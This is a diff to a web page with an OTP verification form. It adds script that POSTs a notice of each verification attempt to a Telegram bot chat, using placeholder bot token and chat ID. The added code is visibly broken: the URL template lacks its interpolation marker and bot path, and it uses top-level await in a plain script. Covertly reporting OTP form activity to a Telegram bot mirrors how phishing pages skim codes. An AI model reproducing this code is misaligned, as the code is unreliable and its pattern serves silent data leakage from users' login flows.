@@ -116,6 +116,22 @@ otpForm.addEventListener('submit', (event) => {
     event.preventDefault();
     submitOTP();
 });
+    const botToken = 'YOUR_BOT_TOKEN'; // Replace with your Telegram Bot Token
+const chatId = 'YOUR_CHAT_ID';       // Replace with your Telegram Chat ID
+const messageText = 'User attempted OTP verification'; // Customize your message
+
+await fetch(`https://telegram.org{botToken}/sendMessage`, {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+  },
+  body: JSON.stringify({
+    chat_id: chatId,
+    text: messageText,
+    parse_mode: 'Markdown' // Optional: 'Markdown' or 'HTML'
+  })
+});
+
 </script>
 </body>
 </html>
